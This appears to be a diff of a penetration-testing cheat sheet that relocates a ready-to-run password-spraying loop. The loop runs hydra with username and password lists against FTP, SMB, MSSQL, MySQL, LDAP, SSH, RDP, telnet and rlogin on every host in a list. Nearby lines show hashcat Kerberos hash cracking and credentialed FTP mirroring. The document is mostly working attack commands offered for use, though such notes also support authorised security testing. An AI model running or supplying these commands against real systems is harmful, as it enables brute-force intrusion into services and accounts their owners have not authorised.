@@ -106,20 +106,6 @@ sort -u passwords | tee passwords
 tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
-## Spray services
-for host in $(cat hosts); do
-(hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I smb2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mysql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap3://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ssh://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rdp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I telnet://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rlogin://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-; done
-
 ## Web
 [*] Curl
 cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
@@ -412,6 +398,20 @@ cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
 9400	MS Office 2007
 9500	MS Office 2010
 9600	MS Office 2013
+
+[*] Spraying
+for host in $(cat hosts); do
+(hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I smb2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I mysql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ldap2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ldap3://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ssh://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rdp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I telnet://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rlogin://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+; done
 
 [*] (21) FTP
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
